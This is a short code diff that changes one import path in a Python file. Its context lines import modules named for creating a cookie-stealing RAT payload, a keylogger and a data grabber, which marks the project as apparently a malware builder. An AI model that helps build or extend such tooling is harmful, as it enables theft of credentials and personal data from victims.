@@ -1,5 +1,5 @@
 from colorama import Fore, init
-from util.common import *
+from util.plugins.common import *
 from util.create_payload import CookiesRAT
 from util.create_key_logger import Create_KeyLogger
 from util.create_data_grabber import Create_Data
